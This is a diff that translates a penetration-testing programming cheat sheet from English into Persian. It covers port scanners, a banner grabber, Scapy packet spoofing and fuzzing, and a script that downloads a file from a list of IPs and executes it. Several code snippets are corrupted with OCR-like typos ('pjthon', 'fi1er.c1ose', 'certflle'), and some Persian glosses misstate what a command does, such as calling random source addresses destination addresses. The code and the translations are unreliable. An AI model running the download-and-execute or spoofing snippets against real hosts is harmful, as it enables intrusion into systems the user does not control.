@@ -1,10 +1,11 @@
 ---
 layout: default
+published: true
 ---
 
-# Programming
+# برنامه نویسی
 
-### Python port scanner
+### اسکنر پورت در python
 
 ```text
 import socket as sk
@@ -18,7 +19,7 @@ for port in range (1, 1024):
     except: continue    
 ```
 
-### Python base64 wordlist
+### ایجاد کلمه های base64 شده در پایتون
 
 ```text
 #!/usr/bin/pjthon
@@ -31,7 +32,7 @@ for line in file1:
     file2.write(new)
 ```
 
-### Convert windows registry hex format to readable ascii
+### تبدیل رجیستری ویندوز از hex به ascii در پایتون
 
 ```text
 import binascii, sys, string
@@ -43,7 +44,7 @@ for char in dataFormatEex:
 print ''\n'' + output
 ```
 
-### Read all files in folder and search for regex 
+### خواندن تمامی فایل های فولدر و جست و جو با regex در پایتون
 
 ```text
 import glob, re
@@ -55,7 +56,7 @@ for msg in glob.glob('/tmp/.txt'):
     fi1er.c1ose()
 ```
 
-### Ssl encrypted simplehttpserver
+### ساخت وبسرور رمز شده با ssl در پایتون
 
 ```text
 # Create SSL cert (follow prompts for customization)
@@ -71,13 +72,13 @@ httpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)
 httpd.serve_forever()
 ```
 
-### Python http server
+### وبسرور با پایتون
 
 ```text
 python -m SimpleHTTPServer 8080
 ```
 
-### Python email sender \(\* sendmail must be installed\)
+### ارسال ایمیل در python \(\* باید sendmail نصب باشد\)
 
 ```text
 #!/usr/bin/python
@@ -106,7 +107,7 @@ time.sleep(4)
 os.system("/etc/init.d/sendmail stop")
 ```
 
-### Loop through ip list, download file over http and execute
+### دریافت فایل از http و اجرای آن
 
 ```text
 #!/usr/bin/python
@@ -131,7 +132,7 @@ if os.path.exists("/tmp/cb.sh"):
     os. system ( "/tmp/cb. sh")
 ```
 
-### Python http banner grabber \(\* takes an ip rane, port and packet delay\)
+### دریافت بنر در python \(\* باید محدوده ip و پورت ها و میزان تاخییر آن مشخص شود\)
 
 ```text
 #!/usr/bin/python
@@ -179,38 +180,38 @@ for header in headers:
         print '%s : %s' % (header,headers[header])
 ```
 
-## Scrapy
+## دستور Scrapy
 
 When you craft TCP packets with Scapy, the underlying OS will not recognize the initial SYN packet and will reply with a RST packet. To mitigate this you need to set the following Iptables rule: iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP 
 
-| **Expression** | **Description** |
+| **عبارت** | **توضیح** |
 | :--- | :--- |
-| from scapy.all import \* | Imports all scapy libraries |
-| ls \(\) | List all avaiable protocols |
-| lsc \(\) | List all scapy functions |
-| conf | Show/set scapy config |
-| IP\(src=RandiP\(\)\) | Generate random src IPs |
-| Ether\(src=RandMAC\(\) I | Generate random src MACs |
-| ip=IP\(src="1.1.1.1",dst="2.2.2.2"\) | Specify IP parameters |
-| tcp=TCP\(dport="443"\) | Specify TCP parameters |
-| data= "TCP data" | Specify data portion |
-| packet=ip/tcp/data | Create IP\(\)/TCP\(\) packet |
-| packet.show\(\) | Display packet configuration |
-| send\(packet,count=1\) | Send 1 packet @ layer 3 |
-| sendp\(packet,count=2\) | Send 2 packets @ layer 2 |
-| sendpfast\(packet\) | Send faster using tcpreply |
-| sr\(packet\) | Send 1 packet & get replies |
-| sr1\(packet\) | Send only return 1st reply |
-| for i in range\(0,1000\): send \(packet·\) | Send packet- 1000 times |
-| sniff\(count=100,iface=eth0\) | Sniff 100 packets on eth0 |
+| from scapy.all import \* | بارگذاری تمامی کتابخانه های scapy |
+| ls \(\) | لیست تمام پروتکل ها |
+| lsc \(\) |لیست تمام توابع |
+| conf | نمایش و تنظیمات |
+| IP\(src=RandiP\(\)\) | ایجاد IP مقصد تصادفی |
+| Ether\(src=RandMAC\(\) I | ایجاد MAC مقصد تصادفی |
+| ip=IP\(src="1.1.1.1",dst="2.2.2.2"\) | تغییر پارامتر ip |
+| tcp=TCP\(dport="443"\) | تغییر پارامتر tcp |
+| data= "TCP data" | مشخص نمودن قسمت داده ها |
+| packet=ip/tcp/data | ایجاد ip و بسته tcp |
+| packet.show\(\) | نمایش تنظیمات بسته |
+| send\(packet,count=1\) | ارسال 1 بسته به لایه 3  |
+| sendp\(packet,count=2\) | ارسال 2 بسته به لایه 3 |
+| sendpfast\(packet\) | ارسال سریع تر با tcpreply |
+| sr\(packet\) | ارسال 1 بسته و دریافت نتیجه  |
+| sr1\(packet\) | ارسال فقط یک پاسخ |
+| for i in range\(0,1000\): send \(packet·\) | ارسال هزار دفعه یک سته |
+| sniff\(count=100,iface=eth0\) | شنود صد بسته در eth0 |
 
-### Send Ipv6 ICMP msg
+### ارسال پیام icmp در ipv6
 
 ```text
 sr ( IPv6 ( src=" ipv6 ", dst="ipv6")/ ICMP ())
 ```
 
-### UDP packet w/ specific payload:
+### بسته udp و پیلود 
 
 ```text
 ip=IP(src="ip", dst="ip")
@@ -222,13 +223,13 @@ wrpcap ("out.pcap",packet) :write to pcap
 send(packet)
 ```
 
-### Ntp fuzzer
+### عملیات Ntp fuzzer
 
 ```text
 packet=IP(src="ip" ,dst=" ip ")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4))
 ```
 
-### Send http message
+### ارسال پیام http
 
 ```text
 from scapy.all import *
@@ -245,9 +246,9 @@ reply,error = sr(ACK)
 print reply.show()
 ```
 
-## Perl
+## زبان Perl
 
-### Perl port scanner
+### اسکنر پورت
 
 ```text
 use strict; use IO::Socket;
@@ -257,41 +258,40 @@ Proto= "tcp",PeerAddr= "127.0.0.1",PeerPort= $port);
 if($remote) {print "$port is open\n"); )
 ```
 
-## Regex Expression
+## قوانین regex
 
-| **Expression** | **Description** |
+| **قانون** | **توضیح** |
 | :--- | :--- |
-| ^ | Start of string |
-| \* | 0 or more |
-| + | 1 or more |
-| ? | 0 or 1 |
-| . | Any char but \n |
-| {3} | Exactly 3 |
-| {3,} | 3 or more |
-| {3,5} | 3 or 4 or 5 |
-| {3\|5} | 3 or 5 |
-| \[345\] | 3 or 4 or 5 |
-| \[ ^34\] | Not 3 or 4 |
-| \[a-z\] | lowercase a-z |
-| \[A-Z\] | uppercase A-Z |
-| \[0-9\] | digit 0-9 |
-| \d | Digit |
-| \D | Not digit |
-| \w | A-Z,a-z,0-9 |
-| \W | Not A-Z,a-z,0-9 |
-| \s | White Space \(\t\r\n\f\) |
-| \S | Not \(\t\r\n\f\) |
-| reg\[ex\] | "rege" or "regx" |
-| regex? | ''rege'' or ''regex'' |
-| regex\* | ''rege'' w/ 0 or more x |
-| regex+ | ''rege'' w/ 1 or more x |
-| \[Rr\]egex | ''Regex'' or ''regex'' |
-| \d{3} | Exactly 3 digits |
-| \d{ 3,\) | 3 or more digits |
-| \[aeiou\] | Any 1 vowel |
-| \(0 \[3-9\] \|1 \[0-9\]\|2 \[0-5\]\) | Numbers 03-25 |
+| ^ | شروع |
+| \* | صفر یا بیشتر |
+| + | یک یا بیشتر |
+| ? | صفر یا یک |
+| . | تمامی کاراکتر ها تا \n |
+| {3} | دقیقا سه |
+| {3,} | سه یا بیشتر |
+| {3,5} | سه یا چهار یا پنج |
+| {3\|5} | سه یا پنج |
+| \[345\] |  سه یا چهار یا پنج |
+| \[ ^34\] | به غیر از سه یا چهار |
+| \[a-z\] | حروف a-z |
+| \[A-Z\] | حروف A-Z |
+| \[0-9\] | ارقام 0-9 |
+| \d | رقم ها |
+| \D | به غیر از رقم |
+| \w | همه ی A-Z,a-z,0-9 |
+| \W | به غیر از  A-Z,a-z,0-9 |
+| \s | فضای خالی \(\t\r\n\f\) |
+| \S | به غیر از \(\t\r\n\f\) |
+| reg\[ex\] | "rege" یا "regx" |
+| regex? | ''rege'' یا ''regex'' |
+| regex\* | ''rege'' w/ 0 یا بیشتر x |
+| regex+ | ''rege'' w/ 1 یا بیشتر x |
+| \[Rr\]egex | ''Regex'' یا ''regex'' |
+| \d{3} | دقیقا سه رقم |
+| \d{ 3,\) | سه یا رقم های بیشتر |
+| \[aeiou\] | هر یک |
+| \(0 \[3-9\] \|1 \[0-9\]\|2 \[0-5\]\) | محدوده 03 تا 25 |
 
-## Ascii tables
+## جدول Ascii
 
 ![IBM](.gitbook/assets/ascii_table.gif)
-
